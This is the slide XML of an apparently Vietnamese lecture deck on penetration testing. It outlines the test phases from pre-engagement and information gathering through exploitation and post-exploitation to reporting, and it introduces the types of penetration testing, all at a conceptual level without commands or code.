              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="857250" indent="-171450" algn="l" defTabSz="685800" rtl="0" eaLnBrk="1" latinLnBrk="0" hangingPunct="1">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="375"/>
              </a:spcBef>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
              <a:defRPr sz="1800" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1200150" indent="-171450" algn="l" defTabSz="685800" rtl="0" eaLnBrk="1" latinLnBrk="0" hangingPunct="1">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="375"/>
              </a:spcBef>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="ü"/>
              <a:defRPr sz="1800" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="1543050" indent="-171450" algn="l" defTabSz="685800" rtl="0" eaLnBrk="1" latinLnBrk="0" hangingPunct="1">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="375"/>
              </a:spcBef>
              <a:buFont typeface="Arial"/>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r>
              <a:rPr lang="en-US" b="1"/>
              <a:t>1.1 T</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" b="1"/>
              <a:t>ư</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1"/>
              <a:t>ơng tác tr</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" b="1"/>
              <a:t>ư</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1"/>
              <a:t>ớc tham gia (Pre-engagement Interaction)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> T</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN"/>
              <a:t>hảo luận về phạm vi và các điều khoản</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> c</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN"/>
              <a:t>ủa thử nghiệm thâm nhập với khách hàng</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="1"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1"/>
              <a:t>1.2 Thu thập thông tin (Intelligent Gathering)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> T</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN"/>
              <a:t>hu thập </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>tất cả những thông tin liên quan đến </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN"/>
              <a:t> tổ chức bằng cách sử dụng mạng xã</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> hội</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN"/>
              <a:t>, Google hacking, footprinting</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>, các công cụ dò quét</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="1"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1"/>
              <a:t>1.3 Mô hình hóa nguy c</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN" b="1"/>
              <a:t>ơ</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1"/>
              <a:t> (Threat modelling)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t> X</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN"/>
              <a:t>ác định bất kỳ lỗ hổng hiện có trên một hệ thống mục tiêu</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>, từ đó định được </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN"/>
              <a:t>phương pháp tấn công hiệu quả nhất</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1645033964"/>
      </p:ext>
    </p:extLst>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
  <p:transition spd="slow">
    <p:push dir="u"/>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542007A9-9FD0-415F-80DB-88A32A93B361}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="3600">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>                                                                                           Kiểm thử thâm nhập (Penetration Testing)</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="en-US" sz="3600">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
            </a:br>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="3600">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C48A8B63-B06D-4649-B969-BCAB7BD4315E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4800600" y="897731"/>
            <a:ext cx="9829800" cy="563563"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr algn="l" defTabSz="685800" rtl="0" eaLnBrk="1" latinLnBrk="0" hangingPunct="1">
              <a:lnSpc>
                <a:spcPct val="90000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPct val="0"/>
              </a:spcBef>
              <a:buNone/>
              <a:defRPr sz="4000" b="1" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="bg1"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
                <a:ea typeface="+mj-ea"/>
                <a:cs typeface="+mj-cs"/>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="3600">
              <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{3341F27E-154B-47D1-AEDE-74C9A0AFAA3F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="990600" y="1752600"/>
            <a:ext cx="10363200" cy="4351338"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0">
            <a:normAutofit fontScale="92500" lnSpcReduction="10000"/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr marL="342900" indent="-342900" algn="l" defTabSz="685800" rtl="0" eaLnBrk="1" latinLnBrk="0" hangingPunct="1">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="750"/>
              </a:spcBef>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="v"/>
              <a:defRPr sz="2400" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:defRPr>
            </a:lvl1pPr>
            <a:lvl2pPr marL="514350" indent="-171450" algn="l" defTabSz="685800" rtl="0" eaLnBrk="1" latinLnBrk="0" hangingPunct="1">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="375"/>
              </a:spcBef>
              <a:buFont typeface="Courier New" panose="02070309020205020404" pitchFamily="49" charset="0"/>
              <a:buChar char="o"/>
              <a:defRPr sz="2000" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:defRPr>
            </a:lvl2pPr>
            <a:lvl3pPr marL="857250" indent="-171450" algn="l" defTabSz="685800" rtl="0" eaLnBrk="1" latinLnBrk="0" hangingPunct="1">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="375"/>
              </a:spcBef>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="Ø"/>
              <a:defRPr sz="1800" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:defRPr>
            </a:lvl3pPr>
            <a:lvl4pPr marL="1200150" indent="-171450" algn="l" defTabSz="685800" rtl="0" eaLnBrk="1" latinLnBrk="0" hangingPunct="1">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="375"/>
              </a:spcBef>
              <a:buFont typeface="Wingdings" panose="05000000000000000000" pitchFamily="2" charset="2"/>
              <a:buChar char="ü"/>
              <a:defRPr sz="1800" kern="1200">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
                <a:ea typeface="+mn-ea"/>
                <a:cs typeface="+mn-cs"/>
              </a:defRPr>
            </a:lvl4pPr>
            <a:lvl5pPr marL="1543050" indent="-171450" algn="l" defTabSz="685800" rtl="0" eaLnBrk="1" latinLnBrk="0" hangingPunct="1">
              <a:lnSpc>
                <a:spcPct val="100000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="375"/>
              </a:spcBef>
              <a:buFont typeface="Arial"/>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r>
              <a:rPr lang="en-US" b="1"/>
              <a:t>1.4 Phân tích lỗ hổng</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Xem xét cách sẽ thâm nhập tấn công mục tiêu</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Trong quá trình phân tích lỗ hổng, kết hợp các thông tin đã có để dự đoán cuộc tấn công có khả thi không.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="1"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1"/>
              <a:t>1.5 Khai thác</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Chỉ nên thực hiện khi biết khai thác sẽ thành công</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Nắm chắc lỗ hổng sẽ tấn công, thử nghiệm một vài lần trước khi tấn công thật</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" b="1"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1"/>
              <a:t>1.6 Sau khai thác</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Loại bỏ dấu vết, thu thập thông tin…</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1"/>
              <a:t>1.7 Báo cáo</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="vi-VN"/>
              <a:t>Tạo báo cáo đánh giá chi tiết về những lỗ hổng, nguy cơ mất an toàn thông tin và trình bày với khách hàng để thẩm định. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>T</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="vi-VN"/>
              <a:t>hảo luận các giải pháp khắc phục các lỗ hổng đã phát hiện.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:endParaRPr lang="en-US"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:endParaRPr lang="vi-VN"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="290675841"/>
      </p:ext>
    </p:extLst>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
  <p:transition spd="slow">
    <p:push dir="u"/>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AutoShape 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{ABAF43EB-8F20-4562-B610-BD28D97BB6A9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="6435725" y="3555327"/>
            <a:ext cx="4232275" cy="2632075"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 13745"/>
            </a:avLst>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="38100">
            <a:solidFill>
              <a:schemeClr val="tx1"/>
            </a:solidFill>
            <a:round/>
            <a:headEnd/>
            <a:tailEnd/>
          </a:ln>
          <a:effectLst/>
          <a:extLst>
            <a:ext uri="{909E8E84-426E-40DD-AFC4-6F175D3DCCD1}">
              <a14:hiddenFill xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main">
                <a:solidFill>
                  <a:srgbClr val="FFFFFF">
                    <a:alpha val="3098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ltLang="en-US" sz="1400">
              <a:latin typeface="Verdana" panose="020B0604030504040204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="14339" name="AutoShape 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{3B2610CC-ACB2-4AAC-9A3D-CC3C77D13A1F}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1583262" y="3586662"/>
            <a:ext cx="4724401" cy="2646363"/>
          </a:xfrm>
          <a:prstGeom prst="roundRect">
            <a:avLst>
              <a:gd name="adj" fmla="val 13745"/>
            </a:avLst>
          </a:prstGeom>
          <a:noFill/>
          <a:ln w="38100">
            <a:solidFill>
              <a:schemeClr val="tx1"/>
            </a:solidFill>
            <a:round/>
            <a:headEnd/>
            <a:tailEnd/>
          </a:ln>
          <a:effectLst/>
          <a:extLst>
            <a:ext uri="{909E8E84-426E-40DD-AFC4-6F175D3DCCD1}">
              <a14:hiddenFill xmlns:a14="http://schemas.microsoft.com/office/drawing/2010/main">
                <a:solidFill>
                  <a:srgbClr val="C0C0C0">
                    <a:alpha val="3098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ltLang="en-US" sz="1400">
              <a:latin typeface="Verdana" panose="020B0604030504040204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="90136" name="Oval 24">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{ED626C06-578B-40BD-8592-1A60FD6CBF83}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="gray">
          <a:xfrm>
            <a:off x="7648066" y="2412822"/>
            <a:ext cx="259766" cy="519351"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:gradFill rotWithShape="1">
            <a:gsLst>
              <a:gs pos="0">
                <a:schemeClr val="accent1">
                  <a:alpha val="32001"/>
                </a:schemeClr>
              </a:gs>
              <a:gs pos="100000">
                <a:schemeClr val="accent1">
                  <a:gamma/>
                  <a:shade val="46275"/>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eaLnBrk="1" hangingPunct="1">
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="15385" name="Group 28">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{CA8BBD87-7E8E-4F8B-B69D-4875803AFE33}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvGrpSpPr>
            <a:grpSpLocks/>
          </p:cNvGrpSpPr>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr bwMode="auto">
          <a:xfrm>
            <a:off x="7905770" y="1950070"/>
            <a:ext cx="1290638" cy="1277937"/>
            <a:chOff x="4166" y="1706"/>
            <a:chExt cx="1252" cy="1252"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:sp>
          <p:nvSpPr>
            <p:cNvPr id="13335" name="Oval 29">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8C87E641-44EF-44CE-A8F1-61F2A2F883CD}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="4166" y="1706"/>
              <a:ext cx="1252" cy="1252"/>
            </a:xfrm>
            <a:prstGeom prst="ellipse">
              <a:avLst/>
            </a:prstGeom>
            <a:gradFill rotWithShape="1">
              <a:gsLst>
                <a:gs pos="0">
                  <a:srgbClr val="636869"/>
                </a:gs>
                <a:gs pos="100000">
                  <a:srgbClr val="D6E1E2"/>
                </a:gs>
              </a:gsLst>
              <a:lin ang="540000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3336" name="Oval 30">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{E88457EC-1EED-4851-9A19-8ACA8FB29B66}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="4182" y="1713"/>
              <a:ext cx="1222" cy="1221"/>
            </a:xfrm>
            <a:prstGeom prst="ellipse">
              <a:avLst/>
            </a:prstGeom>
            <a:gradFill rotWithShape="1">
              <a:gsLst>
                <a:gs pos="0">
                  <a:srgbClr val="D6E1E2">
                    <a:alpha val="0"/>
                  </a:srgbClr>
                </a:gs>
                <a:gs pos="100000">
                  <a:srgbClr val="F1F5F5"/>
                </a:gs>
              </a:gsLst>
              <a:lin ang="540000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3337" name="Oval 31">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{56E2175C-51AE-47E0-A106-37E7432A8A90}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="4195" y="1725"/>
              <a:ext cx="1162" cy="1141"/>
            </a:xfrm>
            <a:prstGeom prst="ellipse">
              <a:avLst/>
            </a:prstGeom>
            <a:gradFill rotWithShape="1">
              <a:gsLst>
                <a:gs pos="0">
                  <a:srgbClr val="AAB2B3"/>
                </a:gs>
                <a:gs pos="100000">
                  <a:srgbClr val="D6E1E2">
                    <a:alpha val="48000"/>
                  </a:srgbClr>
                </a:gs>
              </a:gsLst>
              <a:lin ang="540000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3338" name="Oval 32">
              <a:extLst>
                <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                  <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{6260D262-4428-42BB-9808-09C6BA2F3DF8}"/>
                </a:ext>
              </a:extLst>
            </p:cNvPr>
            <p:cNvSpPr>
              <a:spLocks noChangeArrowheads="1"/>
            </p:cNvSpPr>
            <p:nvPr/>
          </p:nvSpPr>
          <p:spPr bwMode="gray">
            <a:xfrm>
              <a:off x="4263" y="1757"/>
              <a:ext cx="1033" cy="926"/>
            </a:xfrm>
            <a:prstGeom prst="ellipse">
              <a:avLst/>
            </a:prstGeom>
            <a:gradFill rotWithShape="1">
              <a:gsLst>
                <a:gs pos="0">
                  <a:srgbClr val="FFFFFF"/>
                </a:gs>
                <a:gs pos="100000">
                  <a:srgbClr val="D6E1E2">
                    <a:alpha val="37999"/>
                  </a:srgbClr>
                </a:gs>
              </a:gsLst>
              <a:lin ang="540000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grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="15388" name="Text Box 39">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{B52620EC-0080-48E5-889F-1A7ADB246884}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="gray">
          <a:xfrm>
            <a:off x="7858656" y="2213828"/>
            <a:ext cx="138486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400" b="1">
                <a:solidFill>
                  <a:srgbClr val="FF0000"/>
                </a:solidFill>
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Bí mật (Covert)</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13323" name="Title 25">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1326525E-2D6A-4E70-85B7-2A3E8365714E}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1919288" y="476251"/>
            <a:ext cx="9129712" cy="563563"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="3600">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Kiểm thử thâm nhập (Penetration Testing)</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="en-US" sz="3600">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
            </a:br>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="3600">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8D983180-E195-42A0-872E-EC69A8E3C607}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr txBox="1">
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="auto">
          <a:xfrm>
            <a:off x="1143000" y="1447800"/>
            <a:ext cx="5932489"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3000" b="1">
                <a:latin typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
                <a:cs typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>2.  Các loại kiểm thử thâm nhập</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="46" name="Oval 24">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{70306491-96A4-4E4F-BC0F-1D8E5B248F27}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="gray">
          <a:xfrm>
            <a:off x="3048000" y="2356628"/>
            <a:ext cx="259766" cy="519351"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:gradFill rotWithShape="1">
            <a:gsLst>
              <a:gs pos="0">
                <a:schemeClr val="accent1">
                  <a:alpha val="32001"/>
                </a:schemeClr>
              </a:gs>
              <a:gs pos="100000">
                <a:schemeClr val="accent1">
                  <a:gamma/>
                  <a:shade val="46275"/>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eaLnBrk="1" hangingPunct="1">
              <a:defRPr/>
            </a:pPr>
            <a:endParaRPr lang="en-US"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="13326" name="Oval 32">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F8BBAAF9-3C0E-4E72-9763-11A926169C96}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noChangeArrowheads="1"/>
          </p:cNvSpPr>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr bwMode="gray">
          <a:xfrm>
            <a:off x="3724276" y="2098675"/>
            <a:ext cx="1065213" cy="946150"/>
          </a:xfrm>
          <a:prstGeom prst="ellipse">
            <a:avLst/>
          </a:prstGeom>
          <a:gradFill rotWithShape="1">
            <a:gsLst>
              <a:gs pos="0">
                <a:srgbClr val="FFFFFF"/>
              </a:gs>
              <a:gs pos="100000">
                <a:srgbClr val="D6E1E2">
                  <a:alpha val="37999"/>
                </a:srgbClr>
              </a:gs>
            </a:gsLst>
            <a:lin ang="540000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grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="48" name="Group 28">
            <a:extLst>
